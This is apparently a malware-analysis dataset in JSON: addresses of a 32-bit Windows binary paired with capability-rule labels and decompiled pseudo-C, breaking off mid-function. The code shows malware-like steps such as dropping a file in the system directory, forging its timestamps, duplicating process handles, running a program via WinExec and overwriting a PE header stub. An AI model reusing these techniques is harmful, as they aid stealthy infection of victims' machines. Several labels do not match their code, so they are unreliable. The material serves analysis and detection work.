{
    "004011a0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.004011a0(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00401490(0x42318c);\n    if (iVar1 != -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 75
    },
    "00401400": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401421) overlaps instruction at (ram,0x0040141f)\n// \n\nbool fcn.00401400(void)\n\n{\n    uint *in_EAX;\n    int32_t iVar1;\n    uchar *puVar2;\n    int32_t unaff_EDI;\n    uint uStack8;\n    \n    puVar2 = &stack0xfffffffc;\n    uStack8 = 0x104;\n    if ((&stack0xfffffffc < 0x10c || *0x10 == 0x110) || (&stack0xfffffffc >= 0x10c && *0x10 != 0x110)) {\n        in_EAX = &uStack8;\n    }\n    else {\n        *(unaff_EDI + -0x73) = *(unaff_EDI + -0x73) - &stack0xfffffeec;\n        puVar2 = &stack0xfffffffd;\n    }\n    iVar1 = fcn.004037e0(0x80000002, 0x42346c, 0x4234ac, puVar2 + -8, puVar2 + -0x10c, in_EAX);\n    if (iVar1 == 0) {\n        return false;\n    }\n    iVar1 = (*_sym.imp.MSVCRT.dll__access)(puVar2 + -0x10c, 0);\n    return iVar1 != -1;\n}\n",
        "token_count": 314
    },
    "004027d0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004028f1) overlaps instruction at (ram,0x004028ef)\n// \n// WARNING: Removing unreachable block (ram,0x004028ee)\n\nint32_t __cdecl\nfcn.004027d0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uchar *arg_20h)\n\n{\n    int32_t iVar1;\n    ushort extraout_DX;\n    uchar *puVar2;\n    uint *puVar3;\n    bool bVar4;\n    uchar var_10ch;\n    uint var_10bh;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00404770(arg_18h, arg_1ch, arg_8h, 0x20, arg_20h + 0x20);\n    bVar4 = false;\n    fcn.00404770(arg_18h, arg_1ch, arg_ch, 0x20, arg_20h + 0x60);\n    puVar2 = arg_20h;\n    if ((!bVar4) && (bVar4)) {\n        puVar2 = arg_20h + 1;\n        out(*arg_20h, extraout_DX);\n    }\n    fcn.00404770(arg_18h, arg_1ch, arg_10h, 0x20, puVar2 + 0xa0);\n    fcn.00404770(arg_18h, arg_1ch, arg_14h, 0x20, puVar2 + 0xe0);\n    iVar1 = fcn.00402780();\n    if (iVar1 == -1) {\n        iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n        puVar2[0x120] = iVar1 % 5;\n    }\n    else {\n        puVar2[0x120] = iVar1;\n    }\n    var_10ch = 0;\n    puVar3 = &var_10bh;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    var_4h = 0x104;\n    *(puVar3 + 2) = 0;\n    // WARNING: Bad instruction - Truncating control flow here\n    iVar1 = fcn.004037e0(0x80000001, 0x4233d4, 0x423400, &var_8h, &var_10ch, &var_4h);\n    if (iVar1 != 0) {\n        iVar1 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_10ch, 0x423450);\n        bVar4 = iVar1 == 0;\n        if (bVar4) {\n            if ((!bVar4) && (bVar4)) {\n                iVar1 = 0;\n            }\n            puVar2[0x120] = puVar2[0x120] | 0x80;\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 727
    },
    "004034f0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040364c) overlaps instruction at (ram,0x0040364b)\n// \n// WARNING: Control flow encountered bad instruction data\n// WARNING: Removing unreachable block (ram,0x0040363e)\n// WARNING: Removing unreachable block (ram,0x00403648)\n// WARNING: Removing unreachable block (ram,0x0040364c)\n\nuint fcn.004034f0(uint param_1)\n\n{\n    uchar *arg_ch;\n    uint uVar1;\n    int32_t iVar2;\n    int32_t extraout_EDX;\n    uint unaff_EBX;\n    uchar *puVar3;\n    uint uVar4;\n    uint *puVar5;\n    uchar uVar6;\n    uint uStack535;\n    uchar uStack276;\n    uint uStack275;\n    uint uStack16;\n    uchar auStack12 [8];\n    \n    puVar3 = &stack0xfffffffc;\n    puVar5 = &uStack535;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    uStack276 = 0;\n    puVar5 = &uStack275;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    uStack16 = 1;\n    *(puVar5 + 2) = 0;\n    uVar6 = (POPCOUNT(((unaff_EBX >> 8) + 0x3cU | 6) + 4) & 1U) == 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    (*_sym.imp.MSVCRT.dll_sprintf)(&uStack276);\n    if ((uVar6) || (!uVar6)) {\n        arg_ch = auStack12;\n    }\n    else {\n        param_1 = 0x34a96cf4;\n        arg_ch = extraout_EDX + 1;\n        puVar3 = *0x8d17b43a + 1;\n    }\n    fcn.00401650(puVar3 + -4, arg_ch);\n    iVar2 = fcn.004033b0(param_1, *(puVar3 + 0xc), *(puVar3 + 0x10), *(puVar3 + 0x14), *(puVar3 + -4), *(puVar3 + -8));\n    if (iVar2 == 0) {\n        return 0;\n    }\n    iVar2 = fcn.00403b90(puVar3 + -0x110, *(puVar3 + -4), *(puVar3 + -8));\n    if (iVar2 == 0) {\n        return 0;\n    }\n    fcn.00401350();\n    // WARNING: Bad instruction - Truncating control flow here\n    iVar2 = fcn.00403940(0x4231e4);\n    if (iVar2 == -1) {\n        iVar2 = fcn.00403940(0x4231d8);\n        if (iVar2 == -1) {\n            uVar1 = *(puVar3 + 8);\n            goto code_r0x004036db;\n        }\n        uVar4 = 0xf;\n    }\n    else {\n        uVar4 = 0xe;\n    }\n    uVar1 = *(puVar3 + 8);\n    iVar2 = fcn.00404d60(uVar1);\n    if (iVar2 != 0) {\n        fcn.00404060(uVar4);\n        fcn.004037d0(uVar4);\n        return 1;\n    }\n    if (*0x423638 == 0) {\n        return 0;\n    }\ncode_r0x004036db:\n    iVar2 = fcn.004010a0(uVar1, puVar3 + -0x110);\n    if (iVar2 == 0) {\n        *(puVar3 + -0xc) = 0;\n    }\n    if ((*(puVar3 + -0xc) != 0) && (iVar2 = fcn.00401130(uVar1),  iVar2 == 0)) {\n        *(puVar3 + -0xc) = 0;\n    }\n    if (*(puVar3 + -0xc) == 0) {\n        uVar1 = fcn.004042a0(uVar1, 0);\n        *(puVar3 + -0xc) = uVar1;\n    }\n    if (*(puVar3 + -0xc) != 0) {\n        fcn.004037d0(0xffffffff);\n    }\n    (*_sym.imp.KERNEL32.dll_Sleep)(1000);\n    (*_sym.imp.KERNEL32.dll_WinExec)(0x4231f8, 0);\n    return *(puVar3 + -0xc);\n}\n",
        "token_count": 1143
    },
    "00403880": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403880(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll__access)(arg_8h, 0);\n    if (iVar1 != -1) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 72
    },
    "00403940": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004039b1) overlaps instruction at (ram,0x004039b0)\n// \n// WARNING: Removing unreachable block (ram,0x004039b1)\n\nuint __cdecl fcn.00403940(int32_t arg_8h)\n\n{\n    code *pcVar1;\n    uint *puVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    bool bVar6;\n    uint var_12ch;\n    uint var_128h;\n    uint var_124h;\n    uint var_108h;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    puVar2 = (**0x423640)(2, 0);\n    if (puVar2 == 0xffffffff) {\n        return 0xffffffff;\n    }\n    var_12ch = 0x128;\n    puVar5 = &var_128h;\n    for (iVar4 = 0x49; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    puVar5 = puVar2;\n    puVar3 = (**0x423644)(puVar2, &var_12ch);\n    pcVar1 = _sym.imp.MSVCRT.dll__stricmp;\n    do {\n        if (puVar3 == NULL) {\ncode_r0x00403a0c:\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(puVar2);\n            return var_4h;\n        }\n        if ((puVar3 < 0) || (puVar3 >= 0)) {\n            puVar5 = &var_108h;\n        }\n        else {\n            puVar3 = puVar3 + -0x1bf31dd6;\n        }\n        *pcVar1 = *pcVar1 & 0xc3;\n        (**(arg_8h + 0x51))(puVar5);\n        iVar4 = (*pcVar1)();\n        bVar6 = iVar4 == 0;\n        puVar2 = puVar3;\n        if (bVar6) {\n            if ((!bVar6) && (bVar6)) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            var_4h = var_124h;\n            goto code_r0x00403a0c;\n        }\n        puVar3 = (**0x423648)(puVar3, &var_12ch);\n    } while( true );\n}\n",
        "token_count": 579
    },
    "00403ab0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403b27)\n\nuint __cdecl fcn.00403ab0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    iVar1 = fcn.00403940(0x4231f8);\n    if (iVar1 == -1) {\n        return 0;\n    }\n    iVar1 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x40, 0, iVar1);\n    if (iVar1 != 0) {\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(arg_8h, iVar1, 0, 0, 0, 2);\n        iVar3 = (*_sym.imp.KERNEL32.dll_DuplicateHandle)(uVar2);\n        if (iVar3 != 0) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n            return 1;\n        }\n        return 0;\n    }\n    return 0;\n}\n",
        "token_count": 227
    },
    "00403b90": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00403b90(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    int32_t *unaff_EDI;\n    bool bVar2;\n    uint var_4h;\n    \n    *0x423638 = fcn.00401400();\n    arg_8h_00 = (*_sym.imp.KERNEL32.dll_CreateFileA)(arg_8h, 0x40000000, 1, 0, 2, 0x80, 0);\n    if (arg_8h_00 == -1) {\n        return 0;\n    }\n    iVar1 = (*_sym.imp.KERNEL32.dll_WriteFile)(arg_8h_00, arg_ch, arg_10h, &var_4h, 0);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    bVar2 = false;\n    if (*0x423638 != 0) {\n        iVar1 = fcn.00403ab0(arg_8h_00);\n        bVar2 = SCARRY4(-(iVar1 != 0), 1);\n        *0x423638 = -(iVar1 != 0) + 1;\n    }\n    if ((bVar2 == *0x423638 < 0) && (bVar2 != *0x423638 < 0)) {\n        out(0xc4, *0x423638);\n        *unaff_EDI = *0x423638;\n    }\n    fcn.004048f0(0, arg_8h_00);\n    if (*0x423638 == 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(arg_8h_00);\n    }\n    return 1;\n}\n",
        "token_count": 417
    },
    "00404490": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040452e) overlaps instruction at (ram,0x0040452d)\n// \n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.00404490(void)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    int32_t extraout_ECX;\n    ushort uVar6;\n    uint *unaff_EDI;\n    uint *puVar7;\n    bool bVar8;\n    unkbyte6 Var9;\n    uint var_80h;\n    uint var_60h;\n    uint var_40h;\n    uchar var_20h;\n    uint var_1fh;\n    \n    iVar3 = fcn.00403dd0();\n    if (iVar3 == 0) {\n        return 0;\n    }\n    fcn.00403e50();\n    iVar3 = fcn.00403940(0x4231f0);\n    bVar8 = iVar3 == -1;\n    if (!bVar8) {\n        return 0;\n    }\n    Var9 = fcn.00402020();\n    uVar6 = Var9 >> 0x20;\n    uVar5 = Var9;\n    *0x42363c = 1;\n    if ((bVar8) || (!bVar8)) {\n        iVar3 = fcn.004011a0();\n        if (iVar3 != 0) {\n            return 0;\n        }\n        var_20h = 0;\n        var_80h._0_1_ = 0;\n        puVar7 = &var_1fh;\n        for (iVar3 = 7; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar7 = 0;\n            puVar7 = puVar7 + 1;\n        }\n        *puVar7 = 0;\n        *(puVar7 + 2) = 0;\n        var_60h._0_1_ = 0;\n        puVar7 = &var_80h + 1;\n        for (iVar3 = 7; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar7 = 0;\n            puVar7 = puVar7 + 1;\n        }\n        *puVar7 = 0;\n        *(puVar7 + 2) = 0;\n        var_40h._0_1_ = 0;\n        puVar7 = &var_60h + 1;\n        for (iVar3 = 7; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar7 = 0;\n            puVar7 = puVar7 + 1;\n        }\n        *puVar7 = 0;\n        *(puVar7 + 2) = 0;\n        iVar3 = 7;\n        uVar5 = 0;\n    }\n    else {\n        uVar1 = in(uVar6);\n        *unaff_EDI = uVar1;\n        iVar3 = extraout_ECX;\n        if (0 < &stack0xffffff74) {\n            uVar5 = in(uVar6);\n            unaff_EDI[1] = uVar5;\n            pcVar2 = swi(3);\n            uVar4 = (*pcVar2)();\n            return uVar4;\n        }\n    }\n    puVar7 = &var_40h + 1;\n    for (; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar7 = uVar5;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = uVar5;\n    *(puVar7 + 2) = uVar5;\n    iVar3 = fcn.004025f0(&var_80h, &var_60h, &var_20h, &var_40h);\n    if (iVar3 == 0) {\n        return 0;\n    }\n    iVar3 = fcn.00404a50(&var_20h);\n    if (iVar3 == 0) {\n        return 0;\n    }\n    iVar3 = fcn.004034f0(&var_80h, &var_60h, 0xdc, 0xbc);\n    return iVar3 != 0;\n}\n",
        "token_count": 956
    },
    "004048f0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.004048f0(uint arg_8h, uchar *arg_ch)\n\n{\n    char cVar1;\n    uchar *puVar2;\n    uchar *puVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint *puVar7;\n    char *pcVar8;\n    char *pcVar9;\n    char *pcVar10;\n    uint *puVar11;\n    bool bVar12;\n    uchar *puVar13;\n    char lpBuffer;\n    uint var_22fh;\n    uchar var_12ch;\n    uint var_12bh;\n    uint var_28h;\n    uint var_24h;\n    uint var_1ch;\n    uint hFile;\n    uchar *var_4h;\n    \n    var_4h = arg_ch;\n    lpBuffer = '\\0';\n    puVar7 = &var_22fh;\n    for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    var_12ch = '\\0';\n    puVar7 = &var_12bh;\n    for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    uVar5 = 0xffffffff;\n    pcVar9 = &lpBuffer;\n    do {\n        pcVar8 = pcVar9;\n        if (uVar5 == 0) break;\n        uVar5 = uVar5 - 1;\n        pcVar8 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar8;\n    } while (cVar1 != '\\0');\n    uVar5 = ~uVar5;\n    puVar7 = pcVar8 + -uVar5;\n    puVar11 = &var_12ch;\n    for (uVar6 = uVar5 >> 2; uVar6 != 0; uVar6 = uVar6 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    for (uVar5 = uVar5 & 3; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    uVar5 = 0xffffffff;\n    pcVar9 = 0x4231c4;\n    do {\n        pcVar8 = pcVar9;\n        if (uVar5 == 0) break;\n        uVar5 = uVar5 - 1;\n        pcVar8 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar8;\n    } while (cVar1 != '\\0');\n    uVar5 = ~uVar5;\n    iVar4 = -1;\n    pcVar9 = &var_12ch;\n    do {\n        pcVar10 = pcVar9;\n        if (iVar4 == 0) break;\n        iVar4 = iVar4 + -1;\n        pcVar10 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar10;\n    } while (cVar1 != '\\0');\n    puVar7 = pcVar8 + -uVar5;\n    puVar11 = pcVar10 + -1;\n    for (uVar6 = uVar5 >> 2; uVar6 != 0; uVar6 = uVar6 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    for (uVar5 = uVar5 & 3; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    puVar13 = &var_12ch;\n    (*_sym.imp.KERNEL32.dll_GetFileAttributesExA)(puVar13, 0, &var_28h);\n    bVar12 = arg_ch == 0xffffffff;\n    puVar3 = var_4h;\n    puVar2 = arg_ch;\n    if (bVar12) {\n        puVar3 = fcn.00401490(arg_8h);\n        bVar12 = puVar3 == 0xffffffff;\n        puVar2 = puVar3;\n        if (bVar12) {\n            return 0;\n        }\n    }\n    if ((puVar2 == 0xffffffff && !bVar12) && (puVar2 != 0xffffffff || bVar12)) {\n        puVar3 = puVar13;\n    }\n    (*_sym.imp.KERNEL32.dll_SetFileTime)(puVar3, &var_24h, &var_1ch, &hFile);\n    if (arg_ch == 0xffffffff) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(puVar3);\n    }\n    return 1;\n}\n",
        "token_count": 1277
    },
    "004011e0": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040120e) overlaps instruction at (ram,0x0040120d)\n// \n\nvoid __fastcall fcn.004011e0(int32_t param_1, char *param_2, uint *param_3, uint32_t param_4)\n\n{\n    int32_t *piVar1;\n    unkuint3 Var2;\n    uint8_t uVar3;\n    char cVar6;\n    uint in_EAX;\n    char cVar7;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uchar *puVar8;\n    uint *unaff_ESI;\n    int32_t unaff_EDI;\n    bool bVar9;\n    uint8_t in_AF;\n    uchar auStack12 [8];\n    \n    bVar9 = (POPCOUNT(auStack12 & 0xff) & 1U) != 0;\n    puVar8 = &stack0xfffffffc;\n    if ((bVar9) && (puVar8 = &stack0xfffffffc,  !bVar9)) {\n        param_3 = unaff_ESI + 1;\n        out(*unaff_ESI, param_2);\n        do {\n            cVar6 = in_EAX >> 8;\n            in_AF = 9 < (in_EAX & 0xf) | in_AF;\n            cVar7 = cVar6 - in_AF;\n            Var2 = CONCAT21(in_EAX >> 0x10, cVar7);\n            uVar3 = -in_AF;\n            in_EAX = CONCAT31(Var2, uVar3);\n        } while (in_AF || cVar6 == *param_2);\n        piVar1 = unaff_EDI + param_2 * 2;\n        *piVar1 = (*piVar1 + 0x7b) - in_AF;\n        *(param_1 + -0x75) = in_EAX;\n        puVar8 = &stack0xfffffffd;\n        param_4 = CONCAT31(Var2, uVar3) | 0x8b;\n        if ((uVar3 | 0x8b) != 0) {\n            out(param_2, uVar3 | 0x8b);\n            uVar4 = uVar3 | 0x8b | Var2 << 8;\n            *0xffff = *0xffff + cVar7;\n            goto code_r0x00401217;\n        }\n    }\n    uVar4 = fcn.00403f00(0, param_3, param_4 + 1 >> 1);\n    uVar4 = uVar4 & 0xffff;\ncode_r0x00401217:\n    *(puVar8 + 8) = uVar4;\n    iVar5 = (*_sym.imp.dbghelp.dll_ImageNtHeader)();\n    *(puVar8 + -8) = iVar5;\n    *(puVar8 + -4) = *(iVar5 + 0x58);\n    iVar5 = *(puVar8 + 8);\n    uVar4 = *(puVar8 + -4);\n    if (iVar5 < uVar4) {\n        iVar5 = (iVar5 - uVar4 & 0xffff) - 1;\n        *(puVar8 + 8) = iVar5;\n    }\n    else {\n        iVar5 = iVar5 - (uVar4 & 0xffff);\n    }\n    if (iVar5 < uVar4 >> 0x10) {\n        iVar5 = (iVar5 - (uVar4 >> 0x10) & 0xffff) - 1;\n        *(puVar8 + 8) = iVar5;\n    }\n    else {\n        iVar5 = iVar5 - (uVar4 >> 0x10);\n    }\n    **(puVar8 + 0x14) = iVar5 + *(puVar8 + 0xc);\n    **(puVar8 + 0x10) = *(*(puVar8 + -8) + 0x58);\n    return;\n}\n",
        "token_count": 877
    },
    "00403f00": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nint32_t __cdecl fcn.00403f00(uint32_t arg_8h, uint16_t *arg_ch, int32_t arg_10h)\n\n{\n    uint16_t *puVar1;\n    \n    puVar1 = arg_ch;\n    if (arg_10h != 0) {\n        arg_ch = arg_10h;\n        do {\n            arg_8h = arg_8h + *puVar1;\n            if (arg_8h >> 0x10 != 0) {\n                arg_8h = (arg_8h >> 0x10) + (arg_8h & 0xffff);\n            }\n            puVar1 = puVar1 + 1;\n            arg_ch = arg_ch + -1;\n        } while (arg_ch != NULL);\n        return (arg_8h >> 0x10) + arg_8h;\n    }\n    return (arg_8h >> 0x10) + arg_8h;\n}\n",
        "token_count": 229
    },
    "00402370": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302",
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004025cf) overlaps instruction at (ram,0x004025ce)\n// \n\nvoid fcn.00402370(void)\n\n{\n    uint32_t *puVar1;\n    uchar *puVar2;\n    uint32_t *in_EAX;\n    int32_t iVar3;\n    char extraout_CH;\n    char extraout_CH_00;\n    int32_t extraout_EDX;\n    int32_t unaff_EBP;\n    int32_t unaff_ESI;\n    int32_t unaff_EDI;\n    bool in_CF;\n    uchar uVar4;\n    bool bVar5;\n    \n    if ((!in_CF) && (in_CF)) {\n        if (*in_EAX <= &stack0xfffffff4 && in_EAX != 0xffffffff) {\n            fcn.004046c0();\n            return;\n        }\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    fcn.004046c0();\n    fcn.004046c0(0x423174);\n    iVar3 = fcn.004046c0();\n    puVar1 = unaff_EDI + 0x6a;\n    puVar2 = *puVar1;\n    *puVar1 = *puVar1 - &stack0xffffffd8;\n    *(iVar3 + 0x58) = (*(iVar3 + 0x58) - unaff_EBP) - (puVar2 < &stack0xffffffd8);\n    fcn.004046c0(0x423174);\n    fcn.004046c0();\n    fcn.004046c0();\n    fcn.004046c0();\n    fcn.004046c0();\n    fcn.004046c0();\n    fcn.004046c0();\n    uVar4 = extraout_CH - 1U < 5;\n    bVar5 = (POPCOUNT(extraout_CH + -6) & 1U) == 0;\n    fcn.004046c0();\n    if ((!bVar5) && (bVar5)) {\n        uVar4 = 0;\n        unaff_ESI = 0x34a96cf4;\n    }\n    fcn.004046c0();\n    if ((!uVar4) && (uVar4)) {\n        *(unaff_ESI + 0x43d1773a) = *(unaff_ESI + 0x43d1773a) ^ 0x6a27e95e;\n    }\n    fcn.004046c0(0x423174);\n    fcn.004046c0();\n    fcn.004046c0();\n    *(extraout_EDX + 8) = *(extraout_EDX + 8) + -0x68;\n    *(extraout_EDX + 0x17) = *(extraout_EDX + 0x17) + extraout_CH_00;\n    fcn.004046c0();\n    return;\n}\n",
        "token_count": 664
    },
    "004037e0": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040385b)\n\nbool __cdecl fcn.004037e0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t iVar1;\n    uint hKey;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(arg_8h, arg_ch, 0, 0xf003f, &hKey);\n    if (iVar1 == 0) {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(hKey, arg_10h, 0, arg_14h, arg_18h, arg_1ch);\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n        return iVar1 == 0;\n    }\n    return false;\n}\n",
        "token_count": 202
    },
    "00404b70": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404c11) overlaps instruction at (ram,0x00404c0d)\n// \n// WARNING: Removing unreachable block (ram,0x00404c38)\n\nuint __cdecl fcn.00404b70(int16_t *arg_8h)\n\n{\n    uint32_t *puVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    int32_t *piVar7;\n    uint32_t uVar8;\n    uint *puVar9;\n    uint32_t unaff_EDI;\n    uint *puVar10;\n    bool bVar11;\n    bool in_OF;\n    bool bVar12;\n    uint var_4h;\n    \n    if ((!in_OF) && (in_OF)) {\n        LOCK();\n    }\n    if (*arg_8h != 0x5a4d) {\n        return 0;\n    }\n    piVar7 = *(arg_8h + 0x1e) + arg_8h;\n    bVar12 = SBORROW4(*piVar7, 0x4550);\n    iVar3 = *piVar7 + -0x4550;\n    bVar11 = *piVar7 == 0x4550;\n    while( true ) {\n        if (!bVar11) {\n            return 0;\n        }\n        if ((bVar11 || bVar12 != iVar3 < 0) || (uVar8 = unaff_EDI,  !bVar11 && bVar12 == iVar3 < 0)) {\n            uVar8 = piVar7[0x16];\n        }\n        if (uVar8 != 0) {\n            return 0;\n        }\n        piVar7 = 0x40;\n        uVar8 = 0x40;\n        puVar1 = arg_8h + 0x1e;\n        bVar12 = SBORROW4(*puVar1, 0x80);\n        uVar4 = *puVar1;\n        iVar3 = uVar4 - 0x80;\n        bVar11 = uVar4 == 0x80;\n        if (*puVar1 < 0x81) {\n            return 0;\n        }\n        if ((uVar4 < 0x81) || (0x80 < uVar4)) break;\n        if (arg_8h != NULL) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n    }\n    if (*(arg_8h + 0x1e) < 0xc0) {\n        uVar8 = *(arg_8h + 0x1e) - 0x80;\n    }\n    puVar2 = sub.MSVCRT.dll_void____cdecl_operator_new_unsigned_int_(uVar8);\n    if (puVar2 == NULL) {\n        return 0;\n    }\n    bVar11 = false;\n    uVar5 = 0;\n    uVar4 = uVar8;\n    if (uVar8 != 0) {\n        do {\n            iVar3 = (*_sym.imp.MSVCRT.dll_rand)();\n            uVar6 = uVar5 + 1;\n            bVar11 = SBORROW4(uVar6, uVar8);\n            uVar4 = uVar6 - uVar8;\n            *(uVar5 + puVar2) = iVar3 % 0xff;\n            uVar5 = uVar6;\n        } while (uVar6 < uVar8);\n    }\n    if ((bVar11 == uVar4 < 0) && (bVar11 != uVar4 < 0)) {\n        uVar8 = uVar8 - 1;\n        *(unaff_EDI | &stack0xfffffffc) = puVar2;\n    }\n    puVar9 = puVar2;\n    puVar10 = arg_8h + 0x40;\n    for (uVar4 = uVar8 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar10 = *puVar9;\n        puVar9 = puVar9 + 1;\n        puVar10 = puVar10 + 1;\n    }\n    for (uVar8 = uVar8 & 3; uVar8 